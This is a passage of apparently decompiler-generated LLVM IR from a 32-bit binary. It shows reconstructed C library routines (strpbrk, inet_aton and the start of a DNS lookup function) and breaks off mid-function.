  %v1_804ed6a = icmp eq i1 %v3_804ed67, false
  br i1 %v1_804ed6a, label %dec_label_pc_804ed72, label %dec_label_pc_804ed6c

dec_label_pc_804ed6c:                             ; preds = %dec_label_pc_804ed59
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804ed6e = load i32, i32* @esi, align 4
  %v2_804ed6e = inttoptr i32 %v1_804ed6e to i32*
  store i32 %v2_804ed65, i32* %v2_804ed6e, align 4
  %v0_804ed9c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ed99

dec_label_pc_804ed72:                             ; preds = %dec_label_pc_804ed59
  %v0_804ed72 = load i32, i32* @edx, align 4
  %v0_804ed74 = load i32, i32* @edi, align 4
  %v8_804ed76 = call i32 @__GI_strpbrk(i8* %v1_804ed67, i32 %v0_804ed74, i32 %v0_804ed72, i32 %v0_804ed72)
  store i32 %v8_804ed76, i32* %eax.global-to-local, align 4
  %v2_804ed7e = icmp eq i32 %v8_804ed76, 0
  %v1_804ed80 = icmp eq i1 %v2_804ed7e, false
  br i1 %v1_804ed80, label %dec_label_pc_804ed91, label %dec_label_pc_804ed82

dec_label_pc_804ed82:                             ; preds = %dec_label_pc_804ed72
  %v0_804ed86 = load i32, i32* @ebx, align 4
  %v5_804ed86 = inttoptr i32 %v0_804ed86 to i8*
  %v8_804ed87 = call i32 @rawmemchr(i8* %v5_804ed86, i32 0, i32 %v8_804ed76, i32 %v8_804ed76)
  br label %dec_label_pc_804ed95

dec_label_pc_804ed91:                             ; preds = %dec_label_pc_804ed72
  %v9_804ed76 = inttoptr i32 %v8_804ed76 to i8*
  store i8 0, i8* %v9_804ed76, align 1
  %v2_804ed94 = add i32 %v8_804ed76, 1
  br label %dec_label_pc_804ed95

dec_label_pc_804ed95:                             ; preds = %dec_label_pc_804ed82, %dec_label_pc_804ed91
  %storemerge = phi i32 [ %v2_804ed94, %dec_label_pc_804ed91 ], [ %v8_804ed87, %dec_label_pc_804ed82 ]
  %v0_804ed95 = phi i32 [ %v2_804ed94, %dec_label_pc_804ed91 ], [ %v8_804ed87, %dec_label_pc_804ed82 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804ed95 = load i32, i32* @esi, align 4
  %v2_804ed95 = inttoptr i32 %v1_804ed95 to i32*
  store i32 %v0_804ed95, i32* %v2_804ed95, align 4
  %v0_804ed97 = load i32, i32* @ebx, align 4
  store i32 %v0_804ed97, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ed99

dec_label_pc_804ed99:                             ; preds = %dec_label_pc_804ed6c, %dec_label_pc_804ed95
  %v0_804ed9c = phi i32 [ %v0_804ed9c.pre, %dec_label_pc_804ed6c ], [ %v0_804ed97, %dec_label_pc_804ed95 ]
  %v2_804ed99 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ed99, i32* @ebx, align 4
  store i32 %v0_804ed45, i32* @esi, align 4
  store i32 %v0_804ed44, i32* @edi, align 4
  ret i32 %v0_804ed9c

; uselistorder directives
  uselistorder i32 %v8_804ed76, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ed99, { 1, 0 }
  uselistorder label %dec_label_pc_804ed95, { 1, 0 }
  uselistorder label %dec_label_pc_804ed59, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804eda1 = load i32, i32* @ebx, align 4
  %v2_804edb825 = load i8, i8* %arg1, align 1
  %v4_804edba29 = icmp eq i8 %v2_804edb825, 0
  br i1 %v4_804edba29, label %dec_label_pc_804edc2, label %dec_label_pc_804edbe.lr.ph

dec_label_pc_804edbe.lr.ph:                       ; preds = %entry
  %v3_804edb826 = zext i8 %v2_804edb825 to i32
  %v5_804edb827 = and i32 %v0_804eda1, -256
  %v6_804edb828 = or i32 %v3_804edb826, %v5_804edb827
  %v4_804eda6 = ptrtoint i8* %arg1 to i32
  %v1_804edb113 = inttoptr i32 %arg2 to i8*
  %v4_804edb1.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804edbe

dec_label_pc_804edac:                             ; preds = %dec_label_pc_804edbe, %dec_label_pc_804edb0
  %v6_804edb123 = phi i32 [ %v6_804edb1, %dec_label_pc_804edb0 ], [ %v6_804edb117, %dec_label_pc_804edbe ]
  %v2_804edb122 = phi i8 [ %v2_804edb1, %dec_label_pc_804edb0 ], [ %v2_804edb114, %dec_label_pc_804edbe ]
  %v0_804edb021 = phi i32 [ %v1_804edb0, %dec_label_pc_804edb0 ], [ %arg2, %dec_label_pc_804edbe ]
  %v15_804edac = icmp eq i8 %v2_804edb122, %v2_804edb833
  br i1 %v15_804edac, label %dec_label_pc_804edc4, label %dec_label_pc_804edb0

dec_label_pc_804edb0:                             ; preds = %dec_label_pc_804edac
  %v1_804edb0 = add i32 %v0_804edb021, 1
  %v1_804edb1 = inttoptr i32 %v1_804edb0 to i8*
  %v2_804edb1 = load i8, i8* %v1_804edb1, align 1
  %v3_804edb1 = zext i8 %v2_804edb1 to i32
  %v5_804edb1 = and i32 %v6_804edb123, -256
  %v6_804edb1 = or i32 %v3_804edb1, %v5_804edb1
  %v4_804edb3 = icmp eq i8 %v2_804edb1, 0
  %v1_804edb5 = icmp eq i1 %v4_804edb3, false
  br i1 %v1_804edb5, label %dec_label_pc_804edac, label %dec_label_pc_804edb7

dec_label_pc_804edb7:                             ; preds = %dec_label_pc_804edb0, %dec_label_pc_804edbe
  %v4_804edb1.pre36 = phi i32 [ %v6_804edb117, %dec_label_pc_804edbe ], [ %v6_804edb1, %dec_label_pc_804edb0 ]
  %v1_804edb7 = add i32 %v0_804edb731, 1
  %v1_804edb8 = inttoptr i32 %v1_804edb7 to i8*
  %v2_804edb8 = load i8, i8* %v1_804edb8, align 1
  %v3_804edb8 = zext i8 %v2_804edb8 to i32
  %v5_804edb8 = and i32 %v6_804edb834, -256
  %v6_804edb8 = or i32 %v3_804edb8, %v5_804edb8
  %v4_804edba = icmp eq i8 %v2_804edb8, 0
  br i1 %v4_804edba, label %dec_label_pc_804edc2, label %dec_label_pc_804edbe

dec_label_pc_804edbe:                             ; preds = %dec_label_pc_804edbe.lr.ph, %dec_label_pc_804edb7
  %v4_804edb1.pre = phi i32 [ %v4_804edb1.pre.pre, %dec_label_pc_804edbe.lr.ph ], [ %v4_804edb1.pre36, %dec_label_pc_804edb7 ]
  %v6_804edb834 = phi i32 [ %v6_804edb828, %dec_label_pc_804edbe.lr.ph ], [ %v6_804edb8, %dec_label_pc_804edb7 ]
  %v2_804edb833 = phi i8 [ %v2_804edb825, %dec_label_pc_804edbe.lr.ph ], [ %v2_804edb8, %dec_label_pc_804edb7 ]
  %v0_804edb731 = phi i32 [ %v4_804eda6, %dec_label_pc_804edbe.lr.ph ], [ %v1_804edb7, %dec_label_pc_804edb7 ]
  %v2_804edb114 = load i8, i8* %v1_804edb113, align 1
  %v3_804edb115 = zext i8 %v2_804edb114 to i32
  %v5_804edb116 = and i32 %v4_804edb1.pre, -256
  %v6_804edb117 = or i32 %v3_804edb115, %v5_804edb116
  %v4_804edb318 = icmp eq i8 %v2_804edb114, 0
  %v1_804edb520 = icmp eq i1 %v4_804edb318, false
  br i1 %v1_804edb520, label %dec_label_pc_804edac, label %dec_label_pc_804edb7

dec_label_pc_804edc2:                             ; preds = %dec_label_pc_804edb7, %entry
  br label %dec_label_pc_804edc4

dec_label_pc_804edc4:                             ; preds = %dec_label_pc_804edac, %dec_label_pc_804edc2
  %v0_804edc6 = phi i32 [ 0, %dec_label_pc_804edc2 ], [ %v0_804edb731, %dec_label_pc_804edac ]
  store i32 %v0_804eda1, i32* @ebx, align 4
  ret i32 %v0_804edc6

; uselistorder directives
  uselistorder i8 %v2_804edb114, { 1, 2, 0 }
  uselistorder i32 %v1_804edb7, { 1, 0 }
  uselistorder i32 %v6_804edb1, { 1, 0 }
  uselistorder i8 %v2_804edb1, { 1, 2, 0 }
  uselistorder i32 %v1_804edb0, { 1, 0 }
  uselistorder i8 %v2_804edb825, { 0, 2, 1 }
  uselistorder i32 %v0_804eda1, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804edc4, { 1, 0 }
  uselistorder label %dec_label_pc_804edbe, { 1, 0 }
  uselistorder label %dec_label_pc_804edb7, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804edcf = ptrtoint i8* %arg1 to i32
  store i32 %v4_804edcf, i32* @ecx, align 4
  %v1_804edd3 = icmp eq i8* %arg1, null
  br i1 %v1_804edd3, label %dec_label_pc_804ee54, label %dec_label_pc_804edd7

dec_label_pc_804edd7:                             ; preds = %entry
  %v0_804ede2.pre = load i32, i32* @global_var_8053720, align 32
  br label %dec_label_pc_804ede2

dec_label_pc_804ede2:                             ; preds = %dec_label_pc_804edd7, %dec_label_pc_804ee2b
  %v2_804ee2b35 = phi i32 [ 1, %dec_label_pc_804edd7 ], [ %v3_804ee2b, %dec_label_pc_804ee2b ]
  %v0_804ede834 = phi i32 [ %v4_804edcf, %dec_label_pc_804edd7 ], [ %v0_804ede84, %dec_label_pc_804ee2b ]
  %v0_804ee4933 = phi i32 [ 0, %dec_label_pc_804edd7 ], [ %v2_804ee31, %dec_label_pc_804ee2b ]
  %v1_804ede8 = inttoptr i32 %v0_804ede834 to i8*
  %v2_804ede8 = load i8, i8* %v1_804ede8, align 1
  %v3_804ede8 = sext i8 %v2_804ede8 to i32
  %v2_804edeb = mul nsw i32 %v3_804ede8, 2
  %v3_804edeb = add i32 %v2_804edeb, %v0_804ede2.pre
  %v4_804edeb = inttoptr i32 %v3_804edeb to i8*
  %v5_804edeb = load i8, i8* %v4_804edeb, align 1
  %v6_804edeb = and i8 %v5_804edeb, 8
  %v7_804edeb = icmp eq i8 %v6_804edeb, 0
  br i1 %v7_804edeb, label %dec_label_pc_804ee54, label %dec_label_pc_804edf2

dec_label_pc_804edf2:                             ; preds = %dec_label_pc_804ede2
  %v4_804ee06.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ee06

dec_label_pc_804edf6:                             ; preds = %dec_label_pc_804ee06
  %v3_804edf6 = mul i32 %v1_804edf6, 10
  %v2_804edf9 = add i32 %v3_804edf6, -48
  %v3_804edf9 = add i32 %v2_804edf9, %v2_804ee08
  %v1_804edfd = add i32 %v3_804edf9, -255
  %v6_804edfd = sub i32 254, %v3_804edf9
  %v7_804edfd = and i32 %v6_804edfd, %v3_804edf9
  %v8_804edfd = icmp slt i32 %v7_804edfd, 0
  %v9_804edfd = icmp eq i32 %v1_804edfd, 0
  %v10_804edfd = icmp slt i32 %v1_804edfd, 0
  %v3_804ee03 = icmp eq i1 %v10_804edfd, %v8_804edfd
  %v4_804ee03 = icmp eq i1 %v9_804edfd, false
  %v5_804ee03 = and i1 %v4_804ee03, %v3_804ee03
  br i1 %v5_804ee03, label %dec_label_pc_804ee54, label %dec_label_pc_804ee05

dec_label_pc_804ee05:                             ; preds = %dec_label_pc_804edf6
  %v1_804ee05 = add i32 %v0_804ee05, 1
  store i32 %v1_804ee05, i32* @ecx, align 4
  br label %dec_label_pc_804ee06

dec_label_pc_804ee06:                             ; preds = %dec_label_pc_804edf2, %dec_label_pc_804ee05
  %v1_804edf6 = phi i32 [ 0, %dec_label_pc_804edf2 ], [ %v3_804edf9, %dec_label_pc_804ee05 ]
  %v4_804ee06 = phi i32 [ %v4_804ee06.pre, %dec_label_pc_804edf2 ], [ %v6_804ee06, %dec_label_pc_804ee05 ]
  %v0_804ee05 = phi i32 [ %v0_804ede834, %dec_label_pc_804edf2 ], [ %v1_804ee05, %dec_label_pc_804ee05 ]
  %v1_804ee06 = inttoptr i32 %v0_804ee05 to i8*
  %v2_804ee06 = load i8, i8* %v1_804ee06, align 1
  %v3_804ee06 = zext i8 %v2_804ee06 to i32
  %v5_804ee06 = and i32 %v4_804ee06, -256
  %v6_804ee06 = or i32 %v3_804ee06, %v5_804ee06
  store i32 %v6_804ee06, i32* @edx, align 4
  %v2_804ee08 = sext i8 %v2_804ee06 to i32
  %v2_804ee0b = mul nsw i32 %v2_804ee08, 2
  %v3_804ee0b = add i32 %v2_804ee0b, %v0_804ede2.pre
  %v4_804ee0b = inttoptr i32 %v3_804ee0b to i16*
  %v5_804ee0b = load i16, i16* %v4_804ee0b, align 2
  %v2_804ee10 = and i16 %v5_804ee0b, 8
  %v3_804ee10 = icmp eq i16 %v2_804ee10, 0
  %v1_804ee12 = icmp eq i1 %v3_804ee10, false
  br i1 %v1_804ee12, label %dec_label_pc_804edf6, label %dec_label_pc_804ee14

dec_label_pc_804ee14:                             ; preds = %dec_label_pc_804ee06
  %v8_804ee14 = sub nsw i32 2, %v2_804ee2b35
  %v9_804ee14 = and i32 %v8_804ee14, %v2_804ee2b35
  %v10_804ee14 = icmp slt i32 %v9_804ee14, 0
  %v11_804ee14 = icmp eq i32 %v2_804ee2b35, 3
  %v12_804ee14 = icmp slt i32 %v2_804ee2b35, 3
  %v3_804ee18 = icmp eq i1 %v12_804ee14, %v10_804ee14
  %v4_804ee18 = icmp eq i1 %v11_804ee14, false
  %v5_804ee18 = and i1 %v4_804ee18, %v3_804ee18
  br i1 %v5_804ee18, label %dec_label_pc_804ee22, label %dec_label_pc_804ee1a

dec_label_pc_804ee1a:                             ; preds = %dec_label_pc_804ee14
  %v10_804ee1a = icmp eq i8 %v2_804ee06, 46
  %v1_804ee1d = icmp eq i1 %v10_804ee1a, false
  br i1 %v1_804ee1d, label %dec_label_pc_804ee54, label %dec_label_pc_804ee1f

dec_label_pc_804ee1f:                             ; preds = %dec_label_pc_804ee1a
  %v1_804ee1f = add i32 %v0_804ee05, 1
  store i32 %v1_804ee1f, i32* @ecx, align 4
  br label %dec_label_pc_804ee2b

dec_label_pc_804ee22:                             ; preds = %dec_label_pc_804ee14
  %v1_804ee22 = add i32 %v0_804ee05, 1
  store i32 %v1_804ee22, i32* @ecx, align 4
  %v4_804ee23 = icmp eq i8 %v2_804ee06, 0
  br i1 %v4_804ee23, label %dec_label_pc_804ee2b, label %dec_label_pc_804ee27

dec_label_pc_804ee27:                             ; preds = %dec_label_pc_804ee22
  %v2_804ee27 = and i16 %v5_804ee0b, 32
  %v3_804ee27 = icmp eq i16 %v2_804ee27, 0
  br i1 %v3_804ee27, label %dec_label_pc_804ee54, label %dec_label_pc_804ee2b

dec_label_pc_804ee2b:                             ; preds = %dec_label_pc_804ee27, %dec_label_pc_804ee22, %dec_label_pc_804ee1f
  %v0_804ede84 = phi i32 [ %v1_804ee22, %dec_label_pc_804ee27 ], [ %v1_804ee22, %dec_label_pc_804ee22 ], [ %v1_804ee1f, %dec_label_pc_804ee1f ]
  %v3_804ee2b = add nuw nsw i32 %v2_804ee2b35, 1
  %v2_804ee2e = mul i32 %v0_804ee4933, 256
  %v2_804ee31 = or i32 %v1_804edf6, %v2_804ee2e
  %v7_804ee37 = icmp sgt i32 %v2_804ee2b35, 3
  br i1 %v7_804ee37, label %dec_label_pc_804ee39, label %dec_label_pc_804ede2

dec_label_pc_804ee39:                             ; preds = %dec_label_pc_804ee2b
  %v4_804ee39 = icmp eq i32 %arg2, 0
  br i1 %v4_804ee39, label %dec_label_pc_804ee56, label %dec_label_pc_804ee45

dec_label_pc_804ee45:                             ; preds = %dec_label_pc_804ee39
  %v1_804ee49 = call i32 @llvm.bswap.i32(i32 %v2_804ee31)
  %v2_804ee4b = inttoptr i32 %arg2 to i32*
  store i32 %v1_804ee49, i32* %v2_804ee4b, align 4
  br label %dec_label_pc_804ee56

dec_label_pc_804ee54:                             ; preds = %dec_label_pc_804ee27, %dec_label_pc_804ee1a, %dec_label_pc_804ede2, %dec_label_pc_804edf6, %entry
  br label %dec_label_pc_804ee56

dec_label_pc_804ee56:                             ; preds = %dec_label_pc_804ee39, %dec_label_pc_804ee45, %dec_label_pc_804ee54
  %v0_804ee5b = phi i32 [ 1, %dec_label_pc_804ee39 ], [ 1, %dec_label_pc_804ee45 ], [ 0, %dec_label_pc_804ee54 ]
  ret i32 %v0_804ee5b

; uselistorder directives
  uselistorder i32 %v2_804ee08, { 1, 0 }
  uselistorder i32 %v6_804ee06, { 1, 0 }
  uselistorder i8 %v2_804ee06, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804ee05, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804edfd, { 1, 0 }
  uselistorder i32 %v3_804edf9, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804ede834, { 1, 0 }
  uselistorder i32 %v2_804ee2b35, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ee56, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ee54, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804ee06, { 1, 0 }
  uselistorder label %dec_label_pc_804ede2, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp34 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_804ee72 = call i32 @malloc(i32 512)
  store i32 %v2_804ee72, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_804ee72, i32* @ebp, align 4
  %v2_804ee80 = call i32 @malloc(i32 1025)
  store i32 %v2_804ee80, i32* %eax.global-to-local, align 4
  %v12_804ee89 = ptrtoint i32* %stack_var_-236 to i32
  %v1_804ee8c = icmp eq i32 %v2_804ee72, 0
  br i1 %v1_804ee8c, label %dec_label_pc_804f505, label %dec_label_pc_804ee94

dec_label_pc_804ee94:                             ; preds = %entry
  %v1_804ee94 = icmp eq i32 %v2_804ee80, 0
  br i1 %v1_804ee94, label %dec_label_pc_804f505, label %dec_label_pc_804ee9c

dec_label_pc_804ee9c:                             ; preds = %dec_label_pc_804ee94
  %v5_804ee9c = icmp eq i32 %arg2, 0
  br i1 %v5_804ee9c, label %dec_label_pc_804f505, label %dec_label_pc_804eeaa

dec_label_pc_804eeaa:                             ; preds = %dec_label_pc_804ee9c
  %v4_804eeaa = ptrtoint i8* %arg1 to i32
  store i32 %v4_804eeaa, i32* %eax.global-to-local, align 4
  %v2_804eeb1 = load i8, i8* %arg1, align 1
  %v3_804eeb1 = icmp eq i8 %v2_804eeb1, 0
  br i1 %v3_804eeb1, label %dec_label_pc_804f505, label %dec_label_pc_804eeba

dec_label_pc_804eeba:                             ; preds = %dec_label_pc_804eeaa
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_804eebe = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_804eebe, i32* @eax, align 4
  store i32 %v4_804eeaa, i32* %edx.global-to-local, align 4
  %v2_804eee1 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804eee1, i32* @ebx, align 4
  %tmp47 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp47, i8** %stack_var_-252, align 4
  %v3_804eee9 = call i32 @__pthread_return_void(i32 %v2_804eee1, i32 134535499)
  store i32 %v3_804eee9, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_8055de8.398 to i8*), i8** %stack_var_-252, align 4
  %v2_804eef5 = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_8055de8.398 to i32))
  %v0_804eefa = load i64, i64* @global_var_8055e00.399, align 8
  %v1_804eefa = trunc i64 %v0_804eefa to i32
  %v1_804eeff = ashr i32 %v1_804eefa, 31
  %v6_804ef00 = and i64 %v0_804eefa, 4294967295
  %v8_804ef00 = zext i32 %v1_804eeff to i64
  %v9_804ef00 = mul nuw i64 %v8_804ef00, 4294967296
  %v10_804ef00 = or i64 %v9_804ef00, %v6_804ef00
  %v14_804ef00 = srem i64 %v10_804ef00, %tmp34
  %v15_804ef00 = trunc i64 %v14_804ef00 to i32
  %v0_804ef07 = load i16, i16* @global_var_805372c.400, align 4
  %v2_804ef16 = load i8*, i8** %stack_var_-252, align 4
  %v3_804ef16 = ptrtoint i8* %v2_804ef16 to i32
  store i32 %v3_804ef16, i32* @eax, align 4
  store i32 134535499, i32* %edx.global-to-local, align 4
  store i8* %tmp47, i8** %stack_var_-252, align 4
  %v3_804ef1b = call i32 @__pthread_return_void(i32 %v2_804eee1, i32 1)
  store i32 %v3_804ef1b, i32* %eax.global-to-local, align 4
  %v4_804f0c2 = inttoptr i32 %v15_804ef00 to i8*
  %v1_804f4e073 = add i32 %v12_804ee89, 28
  %v2_804f4e074 = inttoptr i32 %v1_804f4e073 to i32*
  %v3_804f4e075 = load i32, i32* %v2_804f4e074, align 4
  %tmp = icmp ult i32 %v3_804f4e075, 3
  br i1 %tmp, label %dec_label_pc_804ef40, label %dec_label_pc_804f505

dec_label_pc_804ef40:                             ; preds = %dec_label_pc_804eeba, %dec_label_pc_804f4e0.backedge
  %v0_804ef4784 = phi i32 [ %v0_804f4e0.pre, %dec_label_pc_804f4e0.backedge ], [ %v12_804ee89, %dec_label_pc_804eeba ]
  %v1_804ef40 = add i32 %v0_804ef4784, 20
  %v2_804ef40 = inttoptr i32 %v1_804ef40 to i32*
  %v3_804ef40 = load i32, i32* %v2_804ef40, align 4
  %v13_804ef40 = icmp eq i32 %v3_804ef40, -1
  br i1 %v13_804ef40, label %dec_label_pc_804ef40.dec_label_pc_804ef56_crit_edge, label %dec_label_pc_804ef47

dec_label_pc_804ef40.dec_label_pc_804ef56_crit_edge: ; preds = %dec_label_pc_804ef40
  %v0_804ef56.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ef56

dec_label_pc_804ef47:                             ; preds = %dec_label_pc_804ef40
  %v3_804ef4a = load i32, i32* %v2_804ef40, align 4
  %v5_804ef4a = add i32 %v0_804ef4784, -16
  %v6_804ef4a = inttoptr i32 %v5_804ef4a to i32*
  store i32 %v3_804ef4a, i32* %v6_804ef4a, align 4
  %v1_804ef4e = call i32 @__libc_close(i32 -1)
  store i32 %v1_804ef4e, i32* %eax.global-to-local, align 4
  %v0_804ef53 = load i32, i32* @esp, align 4
  %v1_804ef53 = add i32 %v0_804ef53, 16
  br label %dec_label_pc_804ef56

dec_label_pc_804ef56:                             ; preds = %dec_label_pc_804ef40.dec_label_pc_804ef56_crit_edge, %dec_label_pc_804ef47
  %v1_804ef56 = phi i32 [ %v0_804ef4784, %dec_label_pc_804ef40.dec_label_pc_804ef56_crit_edge ], [ %v1_804ef53, %dec_label_pc_804ef47 ]
  %v0_804ef56 = phi i32 [ %v0_804ef56.pre, %dec_label_pc_804ef40.dec_label_pc_804ef56_crit_edge ], [ %v1_804ef4e, %dec_label_pc_804ef47 ]
  %v2_804ef56 = add i32 %v1_804ef56, -4
  %v3_804ef56 = inttoptr i32 %v2_804ef56 to i32*
  store i32 %v0_804ef56, i32* %v3_804ef56, align 4
  %v1_804ef57 = add i32 %v1_804ef56, -8
  %v2_804ef57 = inttoptr i32 %v1_804ef57 to i32*
  store i32 512, i32* %v2_804ef57, align 4
  %v1_804ef5c = add i32 %v1_804ef56, -12
  %v2_804ef5c = inttoptr i32 %v1_804ef5c to i32*
  store i32 0, i32* %v2_804ef5c, align 4
  %v2_804ef5e = add i32 %v1_804ef56, -16
  %v3_804ef5e = inttoptr i32 %v2_804ef5e to i32*
  store i32 %v2_804ee72, i32* %v3_804ef5e, align 4
  %v4_804ef5f = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_804ef00, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ef5f, i32* %eax.global-to-local, align 4
  %v0_804ef64 = load i32, i32* @esp, align 4
  %v1_804ef67 = add i32 %v0_804ef64, 8
  %v2_804ef67 = inttoptr i32 %v1_804ef67 to i32*
  store i32 48, i32* %v2_804ef67, align 4
  %v1_804ef69 = add i32 %v0_804ef64, 4
  %v2_804ef69 = inttoptr i32 %v1_804ef69 to i32*
  store i32 0, i32* %v2_804ef69, align 4
  %v1_804ef6b = add i32 %v0_804ef64, 84
  store i32 %v1_804ef6b, i32* @ebx, align 4
  %v3_804ef6f = inttoptr i32 %v0_804ef64 to i32*
  store i32 %v1_804ef6b, i32* %v3_804ef6f, align 4
  %v4_804ef70 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_804ef00, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ef70, i32* %eax.global-to-local, align 4
  %v0_804ef75 = load i32, i32* @esp, align 4
  %v1_804ef75 = add i32 %v0_804ef75, 72
  %v2_804ef75 = inttoptr i32 %v1_804ef75 to i32*
  %v3_804ef75 = load i32, i32* %v2_804ef75, align 4
  store i32 %v3_804ef75, i32* %eax.global-to-local, align 4
  %v1_804ef79 = add i32 %v0_804ef75, 116
  %v2_804ef79 = inttoptr i32 %v1_804ef79 to i32*
  store i32 1, i32* %v2_804ef79, align 4
  %v0_804ef81 = load i32, i32* @esp, align 4
  %v1_804ef81 = add i32 %v0_804ef81, 104
  %v2_804ef81 = inttoptr i32 %v1_804ef81 to i32*
  store i32 1, i32* %v2_804ef81, align 4
  %v0_804ef89 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ef89 = add i32 %v0_804ef89, 1
  %v1_804ef8a = urem i32 %v1_804ef89, 65536
  store i32 %v1_804ef8a, i32* %eax.global-to-local, align 4
  %v1_804ef8f = load i32, i32* @esp, align 4
  %v2_804ef8f = add i32 %v1_804ef8f, 72
  %v3_804ef8f = inttoptr i32 %v2_804ef8f to i32*
  store i32 %v1_804ef8a, i32* %v3_804ef8f, align 4
  %v0_804ef93 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ef93 = load i32, i32* @esp, align 4
  %v2_804ef93 = add i32 %v1_804ef93, 84
  %v3_804ef93 = inttoptr i32 %v2_804ef93 to i32*
  store i32 %v0_804ef93, i32* %v3_804ef93, align 4
  %v0_804ef97 = load i32, i32* @esp, align 4
  %v1_804ef9a = add i32 %v0_804ef97, 8
  %v2_804ef9a = inttoptr i32 %v1_804ef9a to i32*
  store i32 512, i32* %v2_804ef9a, align 4
  %v2_804ef9f = add i32 %v0_804ef97, 4
  %v3_804ef9f = inttoptr i32 %v2_804ef9f to i32*
  store i32 %v2_804ee72, i32* %v3_804ef9f, align 4
  %v0_804efa0 = load i32, i32* @ebx, align 4
  %v3_804efa0 = inttoptr i32 %v0_804ef97 to i32*
  store i32 %v0_804efa0, i32* %v3_804efa0, align 4
  %v0_804efa1 = call i32 @__encode_header()
  store i32 %v0_804efa1, i32* %eax.global-to-local, align 4
  %v0_804efa6 = load i32, i32* @esp, align 4
  %v2_804efa9 = icmp slt i32 %v0_804efa1, 0
  store i32 %v0_804efa1, i32* @ebx, align 4
  br i1 %v2_804efa9, label %dec_label_pc_804f505, label %dec_label_pc_804efb3

dec_label_pc_804efb3:                             ; preds = %dec_label_pc_804ef56
  %v2_804efb3 = add i32 %v0_804efa6, 12
  %v3_804efb3 = inttoptr i32 %v2_804efb3 to i32*
  store i32 %v0_804efa1, i32* %v3_804efb3, align 4
  %v1_804efb4 = add i32 %v0_804efa6, 8
  %v2_804efb4 = inttoptr i32 %v1_804efb4 to i32*
  store i32 1025, i32* %v2_804efb4, align 4
  %v1_804efb9 = add i32 %v0_804efa6, 256
  %v2_804efb9 = inttoptr i32 %v1_804efb9 to i32*
  %v3_804efb9 = load i32, i32* %v2_804efb9, align 4
  %v5_804efb9 = add i32 %v0_804efa6, 4
  %v6_804efb9 = inttoptr i32 %v5_804efb9 to i32*
  store i32 %v3_804efb9, i32* %v6_804efb9, align 4
  %v1_804efc0 = add i32 %v0_804efa6, 28
  %v2_804efc0 = inttoptr i32 %v1_804efc0 to i32*
  %v3_804efc0 = load i32, i32* %v2_804efc0, align 4
  %v6_804efc0 = inttoptr i32 %v0_804efa6 to i32*
  store i32 %v3_804efc0, i32* %v6_804efc0, align 4
  %v4_804efc4 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_804ef00, i32 ptrtoint (i32* @0 to i32))
  %v0_804efc9 = load i32, i32* @esp, align 4
  %v1_804efcc = add i32 %v0_804efc9, 8
  %v2_804efcc = inttoptr i32 %v1_804efcc to i32*
  store i32 ptrtoint (i32* @global_var_8053730.338 to i32), i32* %v2_804efcc, align 4
  %v1_804efd1 = add i32 %v0_804efc9, 4
  %v2_804efd1 = inttoptr i32 %v1_804efd1 to i32*
  store i32 134535499, i32* %v2_804efd1, align 4
  %v1_804efd6 = add i32 %v0_804efc9, 200
  store i32 %v1_804efd6, i32* @eax, align 4
  %v3_804efdd = inttoptr i32 %v0_804efc9 to i32*
  store i32 %v1_804efd6, i32* %v3_804efdd, align 4
  %v2_804efde = call i32 @__pthread_return_void(i32 -1, i32 %v15_804ef00)
  store i32 %v2_804efde, i32* %eax.global-to-local, align 4
  %v0_804efe3 = load i32, i32* @esp, align 4
  %v1_804efe3 = inttoptr i32 %v0_804efe3 to i32*
  store i32 ptrtoint (i32* @global_var_8053730.338 to i32), i32* %v1_804efe3, align 4
  %v1_804efea = call i32 @__pthread_return_0(i32 -1)
